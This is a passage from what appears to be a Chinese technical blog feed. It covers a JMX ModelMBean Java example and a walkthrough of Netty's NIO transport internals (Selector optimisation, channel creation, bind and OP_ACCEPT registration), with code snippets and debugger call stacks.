ModelMBeanAttributeInfo(<span class="hljs-comment">//</span>                <span class="hljs-string">"Name"</span>, <span class="hljs-comment">// 属性名</span>                STRING_CLASS, <span class="hljs-comment">//属性类型</span>                <span class="hljs-string">"people name"</span>, <span class="hljs-comment">// 描述文字</span>                READABLE, WRITABLE, !BOOLEAN, <span class="hljs-comment">// 读写</span>                portAttrDesc <span class="hljs-comment">// 属性描述</span>        );        <span class="hljs-comment">//////////////////////////////////////////////////////////////////</span>        <span class="hljs-comment">//                        方法                                        //</span>        <span class="hljs-comment">//////////////////////////////////////////////////////////////////</span>        <span class="hljs-comment">// 构造 getName操作描述符信息</span>        Descriptor getStateDesc = <span class="hljs-keyword">new</span> DescriptorSupport(<span class="hljs-keyword">new</span> String[] &#123;                <span class="hljs-string">"name=getName"</span>,                <span class="hljs-string">"descriptorType=operation"</span>,                <span class="hljs-string">"class=com.test.jmx.modelBean.Hello"</span>,                <span class="hljs-string">"role=operation"</span>        &#125;);        ModelMBeanOperationInfo getName = <span class="hljs-keyword">new</span> ModelMBeanOperationInfo(<span class="hljs-comment">//</span>                <span class="hljs-string">"getName"</span>, <span class="hljs-comment">//</span>                <span class="hljs-string">"get name attribute"</span>, <span class="hljs-comment">//</span>                <span class="hljs-keyword">null</span>, <span class="hljs-comment">//</span>                <span class="hljs-string">"java.lang.String"</span>, <span class="hljs-comment">//</span>                MBeanOperationInfo.ACTION, <span class="hljs-comment">//</span>                getStateDesc <span class="hljs-comment">//</span>        );        <span class="hljs-comment">// 构造 setName操作描述符信息</span>        Descriptor setStateDesc = <span class="hljs-keyword">new</span> DescriptorSupport(<span class="hljs-keyword">new</span> String[] &#123;                <span class="hljs-string">"name=setName"</span>, <span class="hljs-string">"descriptorType=operation"</span>, <span class="hljs-string">"class=com.test.jmx.modelBean.Hello"</span>,                <span class="hljs-string">"role=operation"</span> &#125;);        MBeanParameterInfo[] setStateParms = <span class="hljs-keyword">new</span> MBeanParameterInfo[] &#123; (<span class="hljs-keyword">new</span> MBeanParameterInfo(                <span class="hljs-string">"name"</span>, <span class="hljs-string">"java.lang.String"</span>, <span class="hljs-string">"new name value"</span>)) &#125;;        ModelMBeanOperationInfo setName = <span class="hljs-keyword">new</span> ModelMBeanOperationInfo(<span class="hljs-comment">//</span>                <span class="hljs-string">"setName"</span>, <span class="hljs-comment">//</span>                <span class="hljs-string">"set name attribute"</span>, <span class="hljs-comment">//</span>                setStateParms, <span class="hljs-comment">//</span>                <span class="hljs-string">"void"</span>, <span class="hljs-comment">//</span>                MBeanOperationInfo.ACTION, <span class="hljs-comment">//</span>                setStateDesc <span class="hljs-comment">//</span>        );        <span class="hljs-comment">//构造 printHello()操作的信息</span>        ModelMBeanOperationInfo print1Info = <span class="hljs-keyword">new</span> ModelMBeanOperationInfo(<span class="hljs-comment">//</span>                <span class="hljs-string">"printHello"</span>, <span class="hljs-comment">//</span>                <span class="hljs-keyword">null</span>, <span class="hljs-comment">//</span>                <span class="hljs-keyword">null</span>, <span class="hljs-comment">//</span>                <span class="hljs-string">"void"</span>, <span class="hljs-comment">//</span>                MBeanOperationInfo.INFO, <span class="hljs-comment">//</span>                <span class="hljs-keyword">null</span> <span class="hljs-comment">//</span>        );        <span class="hljs-comment">// 构造printHello(String whoName)操作信息</span>        ModelMBeanOperationInfo print2Info;        MBeanParameterInfo[] param2 = <span class="hljs-keyword">new</span> MBeanParameterInfo[<span class="hljs-number">1</span>];        param2[<span class="hljs-number">0</span>] = <span class="hljs-keyword">new</span> MBeanParameterInfo(<span class="hljs-string">"whoName"</span>, STRING_CLASS, <span class="hljs-string">"say hello to who"</span>);        print2Info = <span class="hljs-keyword">new</span> ModelMBeanOperationInfo(<span class="hljs-comment">//</span>                <span class="hljs-string">"printHello"</span>, <span class="hljs-comment">//</span>                <span class="hljs-keyword">null</span>,<span class="hljs-comment">//</span>                param2,<span class="hljs-comment">//</span>                <span class="hljs-string">"void"</span>, <span class="hljs-comment">//</span>                MBeanOperationInfo.INFO, <span class="hljs-comment">//</span>                <span class="hljs-keyword">null</span><span class="hljs-comment">//</span>        );        <span class="hljs-comment">//////////////////////////////////////////////////////////////////</span>        <span class="hljs-comment">//                        最后总合                                    //</span>        <span class="hljs-comment">//////////////////////////////////////////////////////////////////</span>        <span class="hljs-comment">// create ModelMBeanInfo</span>        ModelMBeanInfo mbeanInfo = <span class="hljs-keyword">new</span> ModelMBeanInfoSupport(<span class="hljs-comment">//</span>                RequiredModelMBean<span class="hljs-class">.<span class="hljs-keyword">class</span>.<span class="hljs-title">getName</span>(), // <span class="hljs-title">MBean</span>类</span><span class="hljs-class">                <span class="hljs-title">null</span>, // 描述文字</span>                new ModelMBeanAttributeInfo[] &#123; // 所有的属性信息（数组）                        nameAttrInfo &#125;,<span class="hljs-comment">//只有一个属性</span>                <span class="hljs-keyword">null</span>, <span class="hljs-comment">// 所有的构造函数信息</span>                <span class="hljs-keyword">new</span> ModelMBeanOperationInfo[] &#123; <span class="hljs-comment">// 所有的操作信息（数组）</span>                        getName,                        setName,                        print1Info,                        print2Info &#125;,<span class="hljs-comment">//</span>                <span class="hljs-keyword">null</span>, <span class="hljs-comment">// 所有的通知信息(本例无)</span>                <span class="hljs-keyword">null</span><span class="hljs-comment">//MBean描述</span>        );        <span class="hljs-keyword">return</span> mbeanInfo;    &#125;&#125;</code></pre><h3 id="启动参数"><a href="#启动参数" class="headerlink" title="启动参数"></a>启动参数</h3><p>简答配置如：<br>-Dcom.sun.management.jmxremote.port=8085<br>-Dcom.sun.management.jmxremote.ssl=false<br>-Dcom.sun.management.jmxremote.authenticate=false</p>]]></content>
    
    
    <categories>
      
      <category>program-language-practice</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>netty之nio传输层</title>
    <link href="/2020/04/22/netty4-transport-nio/"/>
    <url>/2020/04/22/netty4-transport-nio/</url>
    
    <content type="html"><![CDATA[<h2 id="nio基本处理逻辑"><a href="#nio基本处理逻辑" class="headerlink" title="nio基本处理逻辑"></a>nio基本处理逻辑</h2><p><a href="https://images.cnblogs.com/cnblogs_com/simoncook/1602252/o_nio%E5%9F%BA%E6%9C%AC%E5%A4%84%E7%90%86%E9%80%BB%E8%BE%91.png" target="_blank" rel="noopener">查看这里</a><br><img src="https://images.cnblogs.com/cnblogs_com/simoncook/1602252/o_nio%E5%9F%BA%E6%9C%AC%E5%A4%84%E7%90%86%E9%80%BB%E8%BE%91.png" srcset="/img/loading.gif" alt="nio基本处理逻辑" />  </p><h2 id="Selector的处理"><a href="#Selector的处理" class="headerlink" title="Selector的处理"></a>Selector的处理</h2><h3 id="Selector实例构建"><a href="#Selector实例构建" class="headerlink" title="Selector实例构建"></a>Selector实例构建</h3><p>NioEventLoop.openSelector()方法先用JDK API构建出来的Selector再用反射将其中的selectedKeys、publicSelectedKeys替换成他优化过的SelectedSelectionKeySet实例。<br>JDK API构建出来的Selector 代码：  </p><pre><code class="hljs java"><span class="hljs-comment">// NioEventLoop</span><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> SelectorProvider provider; <span class="hljs-comment">// SelectorProvider.provider() 直接用JDK提供的prodvider prodiver一下，在mac上返回值是sun.nio.ch.KQueueSelectorProvider@1b26f7b2 对应的selector实现是sun.nio.ch.KQueueSelectorImpl@23fe1d71</span>unwrappedSelector = provider.openSelector();<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> SelectorTuple(unwrappedSelector,                                 <span class="hljs-keyword">new</span> SelectedSelectionKeySetSelector(unwrappedSelector, selectedKeySet));</code></pre><p>unwrappedSelector是指我们通常用JDK的API构建出来的Selector，实际netty使用的是经过他自己优化过的<code>SelectorTuple</code>。下面有分析<code>SelectorTuple</code>。 </p><p>用反射方法替换：<br>io.netty.channel.nio.NioEventLoop.openSelector() 用法反射的方式将netty声明的SelectedSelectionKeySet实例selectedKeySet (netty的SelectedSelectionKeySet类继承了java.util.AbstractSet)赋值给了selectorImplClass。因为SelectedSelectionKeySet更快，参见下面SelectorTuple分析部分。<br>selectorImplClass是什么呢？就是各平台的Selector的实现，netty是怎么获取的呢？<br>直接加载”sun.nio.ch.SelectorImpl”即可。<br>而且用这种方式替换完之后，每次select之后，只要处理(跌代理里面的key)刚才这个SelectedSelectionKeySet实例selectedKeys(selectedKeySet会赋值给selectedKeys)，这个实例也是NioEventLoop的实例变量。简单地说，每次select之后，选中的有事件的key就已经在<code>NioEventLoop</code>的实例变量<code>selectedKeys</code>字段中了。   </p><h3 id="SelectorTuple分析"><a href="#SelectorTuple分析" class="headerlink" title="SelectorTuple分析"></a>SelectorTuple分析</h3><p>SelectorTuple依靠<code>SelectedSelectionKeySetSelector</code>和<code>SelectedSelectionKeySet</code>完成优化，<code>SelectedSelectionKeySet</code>内部采用了==数组来替换了JDK实现中的hashset==来维护SelectionKey，提升了add reset 与迭代的效率。<strong>真是佩服</strong>！    </p><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SelectedSelectionKeySet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractSet</span>&lt;<span class="hljs-title">SelectionKey</span>&gt; </span>&#123;    SelectionKey[] keys;    <span class="hljs-keyword">int</span> size;<span class="hljs-comment">// ......</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">add</span><span class="hljs-params">(SelectionKey o)</span> </span>&#123;        <span class="hljs-keyword">if</span> (o == <span class="hljs-keyword">null</span>) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;        &#125;        keys[size++] = o;        <span class="hljs-keyword">if</span> (size == keys.length) &#123;            increaseCapacity();        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">reset</span><span class="hljs-params">(<span class="hljs-keyword">int</span> start)</span> </span>&#123;        Arrays.fill(keys, start, size, <span class="hljs-keyword">null</span>);        size = <span class="hljs-number">0</span>;    &#125;&#125;<span class="hljs-comment">// ...</span><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SelectedSelectionKeySetSelector</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Selector</span> </span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> SelectedSelectionKeySet selectionKeys;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Selector delegate;    SelectedSelectionKeySetSelector(Selector delegate, SelectedSelectionKeySet selectionKeys) &#123;        <span class="hljs-keyword">this</span>.delegate = delegate;        <span class="hljs-keyword">this</span>.selectionKeys = selectionKeys;    &#125;&#125;<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SelectorTuple</span> </span>&#123;    <span class="hljs-keyword">final</span> Selector unwrappedSelector;    <span class="hljs-keyword">final</span> Selector selector;    SelectorTuple(Selector unwrappedSelector) &#123;        <span class="hljs-keyword">this</span>.unwrappedSelector = unwrappedSelector;        <span class="hljs-keyword">this</span>.selector = unwrappedSelector;    &#125;    SelectorTuple(Selector unwrappedSelector, Selector selector) &#123;        <span class="hljs-keyword">this</span>.unwrappedSelector = unwrappedSelector;        <span class="hljs-keyword">this</span>.selector = selector;    &#125;&#125;</code></pre><h2 id="ServerSocketChannel创建与初始化"><a href="#ServerSocketChannel创建与初始化" class="headerlink" title="ServerSocketChannel创建与初始化"></a>ServerSocketChannel创建与初始化</h2><h3 id="ServerSocketChannel创建过程"><a href="#ServerSocketChannel创建过程" class="headerlink" title="ServerSocketChannel创建过程"></a>ServerSocketChannel创建过程</h3><p>bind的时候会创建ServerSocketChannel，并丢给NioServerSocketChannel实例的ch字段<br>调用栈：  </p><pre><code class="hljs java">Thread [main] (Suspended (modification of field ch in AbstractNioChannel))io.netty.channel.socket.nio.NioServerSocketChannel(io.netty.channel.nio.AbstractNioChannel).&lt;init&gt;(io.netty.channel.Channel, java.nio.channels.SelectableChannel, <span class="hljs-keyword">int</span>) line: <span class="hljs-number">85</span>io.netty.channel.socket.nio.NioServerSocketChannel(io.netty.channel.nio.AbstractNioMessageChannel).&lt;init&gt;(io.netty.channel.Channel, java.nio.channels.SelectableChannel, <span class="hljs-keyword">int</span>) line: <span class="hljs-number">42</span>io.netty.channel.socket.nio.NioServerSocketChannel.&lt;init&gt;(java.nio.channels.ServerSocketChannel) line: <span class="hljs-number">88</span>io.netty.channel.socket.nio.NioServerSocketChannel.&lt;init&gt;() line: <span class="hljs-number">74</span>sun.reflect.NativeConstructorAccessorImpl.newInstance0(java.lang.reflect.Constructor&lt;?&gt;, java.lang.Object[]) line: not available [<span class="hljs-keyword">native</span> method]sun.reflect.NativeConstructorAccessorImpl.newInstance(java.lang.Object[]) line: <span class="hljs-number">62</span>sun.reflect.DelegatingConstructorAccessorImpl.newInstance(java.lang.Object[]) line: <span class="hljs-number">45</span>java.lang.reflect.Constructor&lt;T&gt;.newInstance(java.lang.Object...) line: <span class="hljs-number">423</span>io.netty.channel.ReflectiveChannelFactory&lt;T&gt;.newChannel() line: <span class="hljs-number">44</span>io.netty.bootstrap.ServerBootstrap(io.netty.bootstrap.AbstractBootstrap&lt;B,C&gt;).initAndRegister() line: <span class="hljs-number">320</span>io.netty.bootstrap.ServerBootstrap(io.netty.bootstrap.AbstractBootstrap&lt;B,C&gt;).doBind(java.net.SocketAddress) line: <span class="hljs-number">282</span>io.netty.bootstrap.ServerBootstrap(io.netty.bootstrap.AbstractBootstrap&lt;B,C&gt;).bind(java.net.SocketAddress) line: <span class="hljs-number">278</span>org.restexpress.RestExpress.bind(java.net.InetSocketAddress) line: <span class="hljs-number">709</span>org.restexpress.RestExpress.bind(java.lang.String, <span class="hljs-keyword">int</span>) line: <span class="hljs-number">686</span>com.code260.ss.resetexpress.RestExpressApp1.main(java.lang.String[]) line: <span class="hljs-number">26</span></code></pre><h2 id="bind的处理"><a href="#bind的处理" class="headerlink" title="bind的处理"></a>bind的处理</h2><h3 id="AbstractBootstrap-doBind逻辑"><a href="#AbstractBootstrap-doBind逻辑" class="headerlink" title="AbstractBootstrap doBind逻辑"></a>AbstractBootstrap doBind逻辑</h3><p>NioServerSocketChannel类继承体系：  </p><pre><code class="hljs java"><span class="hljs-comment">// AttributeMap体系</span><span class="hljs-number">251</span> AttributeMap--<span class="hljs-number">251.2</span> DefaultAttributeMap----<span class="hljs-number">251.2</span><span class="hljs-number">.1</span> AbstractChannel------<span class="hljs-number">251.2</span><span class="hljs-number">.1</span><span class="hljs-number">.7</span> AbstractNioChannel--------<span class="hljs-number">251.2</span><span class="hljs-number">.1</span><span class="hljs-number">.7</span><span class="hljs-number">.1</span> AbstractNioMessageChannel----------<span class="hljs-number">251.2</span><span class="hljs-number">.1</span><span class="hljs-number">.7</span><span class="hljs-number">.1</span><span class="hljs-number">.5</span> NioServerSocketChannel<span class="hljs-comment">// Channel体系</span>--<span class="hljs-number">463.1</span> Channel----<span class="hljs-number">463.1</span><span class="hljs-number">.2</span> AbstractChannel  <span class="hljs-comment">// 与pipeline绑定。 构建时就会创建pipeline，newChannelPipeline。</span>------<span class="hljs-number">463.1</span><span class="hljs-number">.2</span><span class="hljs-number">.7</span> AbstractNioChannel  <span class="hljs-comment">// 支持多种不同实现的SelectableChannel，ServerSocketChannel与SocketChannel都是SelectableChannel的实现。支持构建AbstractNioChannel时指定感兴趣的事件(readInterestOp)并与该Channel实例绑定(会赋值给实例字段readInterestOp)，且在该类构造方法中将channel设置为非阻塞。可见，其意在Select的Channel与感兴趣的事件的封装  </span>--------<span class="hljs-number">463.1</span><span class="hljs-number">.2</span><span class="hljs-number">.7</span><span class="hljs-number">.1</span> AbstractNioMessageChannel <span class="hljs-comment">// 意在定义读写Message(其实就是消息对象，一个Object或者一组Object)接口。并对doWrite做了一些实现。</span>----------<span class="hljs-number">463.1</span><span class="hljs-number">.2</span><span class="hljs-number">.7</span><span class="hljs-number">.1</span><span class="hljs-number">.5</span> NioServerSocketChannel</code></pre><ol><li>initAndRegister并返回ChannelFuture实例，具体逻辑参见下面小节  </li><li>doBind0  交由boss线程去做真正bind动作</li></ol><h4 id="io-netty-bootstrap-AbstractBootstrap-initAndRegister-逻辑"><a href="#io-netty-bootstrap-AbstractBootstrap-initAndRegister-逻辑" class="headerlink" title="io.netty.bootstrap.AbstractBootstrap.initAndRegister()逻辑"></a>io.netty.bootstrap.AbstractBootstrap.initAndRegister()逻辑</h4><ol><li><strong>==创建Channel==</strong>，即<strong>==ServerSocketChannel==</strong>实例，并将值包装到netty自己封装的NioServerSocketChannel中。channel = channelFactory.newChannel();  </li><li><strong>==初始化channel==</strong>。init(channel);根据io.netty.bootstrap.AbstractBootstrap.options给Channel<strong>==配置一些参数==</strong>。server端chanel的参数有{SO_BACKLOG=1024, SO_REUSEADDR=true, CONNECT_TIMEOUT_MILLIS=10000, SO_RCVBUF=262140, RCVBUF_ALLOCATOR=io.netty.channel.AdaptiveRecvByteBufAllocator@17cdf2d0}。并在Channel对应的pipeline上<strong>==绑定ChannelInitializer==</strong>。  </li><li><strong>==注册Channel==</strong>，先 <strong>==选出一个Executor即NioEventLoop==</strong> ， 选的方法逻辑在io.netty.util.concurrent.DefaultEventExecutorChooserFactory$PowerOfTwoEventExecutorChooser@15cafec7  中 executors[idx.getAndIncrement() &amp; executors.length - 1]。然后用io.netty.channel.SingleThreadEventLoop.register(Channel)<strong>==注册Channel到Exceutor(即NioEventLoop)中==</strong>。注册时限看是否是当前EventLoop（对于单线程执行器来说就是看是否是本线程），如果是 直接注册，如果不是则new一个Runnbale出来把注册逻辑包进去 并交给当前eventLoop执行这个runnable。<br>注册的细节是： io.netty.channel.AbstractChannel.AbstractUnsafe.register(EventLoop, ChannelPromise)<br>执行的细节是： io.netty.util.concurrent.SingleThreadEventExecutor.execute(Runnable)<br>内部实现是将task放到io.netty.util.concurrent.SingleThreadEventExecutor.taskQueue这个队列中，这个队列目前实现是io.netty.util.internal.shaded.org.jctools.queues.MpscUnboundedArrayQueue。并在此时判断是否是本线程，如果不实现本线程就<strong>==把对应的线程给启动==</strong>了。<br>io.netty.channel.AbstractChannel.AbstractUnsafe.register0(ChannelPromise)  这是 <strong>==register的后处理==</strong> ：  </li></ol><ul><li>先设置ChannelPromise为成功</li><li>重要的事情之一：  就是会触发ChannelInboundHandler的channelRegistered事件，这是业务侧可以定制的，执行是在boss线程做的  </li><li>绑定成功了 然后 触发active事件，是否绑定成功的判断方式是：  <pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isActive</span><span class="hljs-params">()</span> </span>&#123;       <span class="hljs-keyword">return</span> javaChannel().socket().isBound();   &#125;</code></pre>其实就是靠JDK的API isBound完成<br>register0的提交方式就是靠下面这种代码完成，netty中有好多这种代码，应该包装一下： <pre><code class="hljs java"><span class="hljs-keyword">if</span> (eventLoop.inEventLoop()) &#123;    register0(promise);&#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">try</span> &#123;        eventLoop.execute(<span class="hljs-keyword">new</span> Runnable() &#123;            <span class="hljs-meta">@Override</span>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;                register0(promise);            &#125;        &#125;);    &#125; <span class="hljs-keyword">catch</span> (Throwable t) &#123;        logger.warn(                <span class="hljs-string">"Force-closing a channel whose registration task was not accepted by an event loop: &#123;&#125;"</span>,                AbstractChannel.<span class="hljs-keyword">this</span>, t);        closeForcibly();        closeFuture.setClosed();        safeSetFailure(promise, t);    &#125;&#125;</code></pre></li></ul><p>上述逻辑因为==是异步==的，所以==可能执行不完==，所以接下来要做出处理：  </p><pre><code class="hljs java"><span class="hljs-comment">// regFuture就是上面初始化并注册的返回的Future，此处先判断他是否完成  </span><span class="hljs-keyword">if</span> (regFuture.isDone()) &#123;    <span class="hljs-comment">// At this point we know that the registration was complete and successful.</span>    ChannelPromise promise = channel.newPromise();    doBind0(regFuture, channel, localAddress, promise); <span class="hljs-comment">// 真正的做bind，在boss线程。且此处是regFuture已经完成的情况下 那就不要用回调了就直接调用doBind0就行了。  </span>    <span class="hljs-keyword">return</span> promise;&#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-comment">// Registration future is almost always fulfilled already, but just in case it's not.</span>    <span class="hljs-keyword">final</span> PendingRegistrationPromise promise = <span class="hljs-keyword">new</span> PendingRegistrationPromise(channel);    regFuture.addListener(<span class="hljs-keyword">new</span> ChannelFutureListener() &#123; <span class="hljs-comment">// 给regFuture注册监听器，等他完成后回调这里，妙啊</span>        <span class="hljs-meta">@Override</span>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">operationComplete</span><span class="hljs-params">(ChannelFuture future)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;            Throwable cause = future.cause();            <span class="hljs-keyword">if</span> (cause != <span class="hljs-keyword">null</span>) &#123;                <span class="hljs-comment">// Registration on the EventLoop failed so fail the ChannelPromise directly to not cause an</span>                <span class="hljs-comment">// IllegalStateException once we try to access the EventLoop of the Channel.</span>                promise.setFailure(cause);            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-comment">// Registration was successful, so set the correct executor to use.</span>                <span class="hljs-comment">// See https://github.com/netty/netty/issues/2586</span>                promise.registered();                doBind0(regFuture, channel, localAddress, promise); <span class="hljs-comment">// 真正的做bind，在boss线程</span>            &#125;        &#125;    &#125;);    <span class="hljs-keyword">return</span> promise;&#125;</code></pre><p>io.netty.util.concurrent.SingleThreadEventExecutor.startThread() 启动线程的写法值得学习，确保正好启动一次。<br>addTaskWakesUp？？  </p><pre><code class="hljs java"><span class="hljs-keyword">if</span> (!addTaskWakesUp &amp;&amp; wakesUpForTask(task)) &#123;           wakeup(inEventLoop);       &#125;</code></pre><ol start="4"><li>创建PendingRegistrationPromise。 对初始化和注册过的ChannelFuture增加监听器，监听ChannelFutureListener.operationComplete完成后回调。因为上面初始化并注册那事是异步的，可能这时还没完成。<br>// 3的wakeup和4要看下<br>以上都没涉及到真正bind端口的地方  </li></ol><h4 id="真正bind"><a href="#真正bind" class="headerlink" title="真正bind"></a>真正bind</h4><p>调用栈：  </p><pre><code class="hljs java"><span class="hljs-comment">// Thread [boss-0] (Suspended)</span>io.netty.channel.socket.nio.NioServerSocketChannel.doBind(java.net.SocketAddress) line: <span class="hljs-number">130</span>io.netty.channel.nio.AbstractNioMessageChannel$NioMessageUnsafe(io.netty.channel.AbstractChannel$AbstractUnsafe).bind(java.net.SocketAddress, io.netty.channel.ChannelPromise) line: <span class="hljs-number">562</span>io.netty.channel.DefaultChannelPipeline$HeadContext.bind(io.netty.channel.ChannelHandlerContext, java.net.SocketAddress, io.netty.channel.ChannelPromise) line: <span class="hljs-number">1332</span>io.netty.channel.DefaultChannelPipeline$HeadContext(io.netty.channel.AbstractChannelHandlerContext).invokeBind(java.net.SocketAddress, io.netty.channel.ChannelPromise) line: <span class="hljs-number">501</span>io.netty.channel.DefaultChannelPipeline$TailContext(io.netty.channel.AbstractChannelHandlerContext).bind(java.net.SocketAddress, io.netty.channel.ChannelPromise) line: <span class="hljs-number">486</span>io.netty.channel.DefaultChannelPipeline.bind(java.net.SocketAddress, io.netty.channel.ChannelPromise) line: <span class="hljs-number">984</span>io.netty.channel.socket.nio.NioServerSocketChannel(io.netty.channel.AbstractChannel).bind(java.net.SocketAddress, io.netty.channel.ChannelPromise) line: <span class="hljs-number">258</span>io.netty.bootstrap.AbstractBootstrap$<span class="hljs-number">2</span>.run() line: <span class="hljs-number">366</span>io.netty.util.concurrent.AbstractEventExecutor.safeExecute(java.lang.Runnable) line: <span class="hljs-number">163</span>io.netty.channel.nio.NioEventLoop(io.netty.util.concurrent.SingleThreadEventExecutor).runAllTasks(<span class="hljs-keyword">long</span>) line: <span class="hljs-number">404</span>io.netty.channel.nio.NioEventLoop.run() line: <span class="hljs-number">495</span>io.netty.util.concurrent.SingleThreadEventExecutor$<span class="hljs-number">5</span>.run() line: <span class="hljs-number">905</span>java.lang.Thread.run() line: <span class="hljs-number">748</span></code></pre><p>boss线程中NioServerSocketChannel.doBind这才是真正bind端口的地方，调用栈如上，代码如下：    </p><pre><code class="hljs java"><span class="hljs-comment">// NioServerSocketChannel</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doBind</span><span class="hljs-params">(SocketAddress localAddress)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;        <span class="hljs-keyword">if</span> (PlatformDependent.javaVersion() &gt;= <span class="hljs-number">7</span>) &#123;            javaChannel().bind(localAddress, config.getBacklog());        &#125; <span class="hljs-keyword">else</span> &#123;            javaChannel().socket().bind(localAddress, config.getBacklog());        &#125;    &#125;</code></pre><h2 id="select和业务处理过程的抽象与逻辑组织"><a href="#select和业务处理过程的抽象与逻辑组织" class="headerlink" title="select和业务处理过程的抽象与逻辑组织"></a>select和业务处理过程的抽象与逻辑组织</h2><h3 id="NioEventLoop主要逻辑"><a href="#NioEventLoop主要逻辑" class="headerlink" title="NioEventLoop主要逻辑"></a>NioEventLoop主要逻辑</h3><ol><li>根据select策略处理select的事情，可能情况包括：  </li><li>根据ioRatio配比进行selectkey的处理(即IO事件)还是跑所有任务(业务逻辑、自定义事件等)。<br>关于selectkey的处理：<br>Field selectedKeysField = selectorImplClass.getDeclaredField(“selectedKeys”);<br>Field publicSelectedKeysField = selectorImplClass.getDeclaredField(“publicSelectedKeys”);</li></ol><p>sun.nio.ch.KQueueSelectorImpl@153cf15c<br>3. 处理异常，注意此处抓的是Throwable异常，这样能防止线程跑飞。目前的异常处理是打了警告日志并sleep 1s防止CPU被完全吃掉。   </p><h2 id="注册OP-ACCEPT事件"><a href="#注册OP-ACCEPT事件" class="headerlink" title="注册OP_ACCEPT事件"></a>注册OP_ACCEPT事件</h2><p>真正注册accept事件的地方：<br>先注册感兴趣的事件为0，注册出key：  </p><pre><code class="hljs java">Thread [boss-<span class="hljs-number">0</span>] (Suspended (breakpoint at line <span class="hljs-number">386</span> in io.netty.channel.nio.AbstractNioChannel))io.netty.channel.socket.nio.NioServerSocketChannel(io.netty.channel.nio.AbstractNioChannel).doRegister() line: <span class="hljs-number">386</span>io.netty.channel.nio.AbstractNioMessageChannel$NioMessageUnsafe(io.netty.channel.AbstractChannel$AbstractUnsafe).register0(io.netty.channel.ChannelPromise) line: <span class="hljs-number">508</span>io.netty.channel.AbstractChannel$AbstractUnsafe.access$<span class="hljs-number">200</span>(io.netty.channel.AbstractChannel$AbstractUnsafe, io.netty.channel.ChannelPromise) line: <span class="hljs-number">427</span>io.netty.channel.AbstractChannel$AbstractUnsafe$<span class="hljs-number">1</span>.run() line: <span class="hljs-number">486</span>io.netty.util.concurrent.AbstractEventExecutor.safeExecute(java.lang.Runnable) line: <span class="hljs-number">163</span>io.netty.channel.nio.NioEventLoop(io.netty.util.concurrent.SingleThreadEventExecutor).runAllTasks(<span class="hljs-keyword">long</span>) line: <span class="hljs-number">404</span>io.netty.channel.nio.NioEventLoop.run() line: <span class="hljs-number">495</span>io.netty.util.concurrent.SingleThreadEventExecutor$<span class="hljs-number">5</span>.run() line: <span class="hljs-number">905</span>java.lang.Thread.run() line: <span class="hljs-number">748</span></code></pre><p>代码</p><pre><code class="hljs java"><span class="hljs-comment">// io.netty.channel.nio.AbstractNioChannel.doRegister()</span><span class="hljs-meta">@Override</span><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doRegister</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;    <span class="hljs-keyword">boolean</span> selected = <span class="hljs-keyword">false</span>;    <span class="hljs-keyword">for</span> (;;) &#123;        <span class="hljs-keyword">try</span> &#123;            selectionKey = javaChannel().register(eventLoop().unwrappedSelector(), <span class="hljs-number">0</span>, <span class="hljs-keyword">this</span>);            <span class="hljs-keyword">return</span>;        &#125; <span class="hljs-keyword">catch</span> (CancelledKeyException e) &#123;            <span class="hljs-keyword">if</span> (!selected) &#123;                <span class="hljs-comment">// Force the Selector to select now as the "canceled" SelectionKey may still be</span>                <span class="hljs-comment">// cached and not removed because no Select.select(..) operation was called yet.</span>                eventLoop().selectNow();                selected = <span class="hljs-keyword">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-comment">// We forced a select operation on the selector before but the SelectionKey is still cached</span>                <span class="hljs-comment">// for whatever reason. JDK bug ?</span>                <span class="hljs-keyword">throw</span> e;            &#125;        &#125;    &#125;&#125;</code></pre><p>再在doBeginRead中注册16，真正注册：<br>boss调用栈：  </p><pre><code class="hljs java">Thread [boss-<span class="hljs-number">0</span>] (Suspended (breakpoint at line <span class="hljs-number">420</span> in io.netty.channel.nio.AbstractNioChannel))io.netty.channel.socket.nio.NioServerSocketChannel(io.netty.channel.nio.AbstractNioChannel).doBeginRead() line: <span class="hljs-number">420</span>io.netty.channel.socket.nio.NioServerSocketChannel(io.netty.channel.nio.AbstractNioMessageChannel).doBeginRead() line: <span class="hljs-number">55</span>io.netty.channel.nio.AbstractNioMessageChannel$NioMessageUnsafe(io.netty.channel.AbstractChannel$AbstractUnsafe).beginRead() line: <span class="hljs-number">851</span>io.netty.channel.DefaultChannelPipeline$HeadContext.read(io.netty.channel.ChannelHandlerContext) line: <span 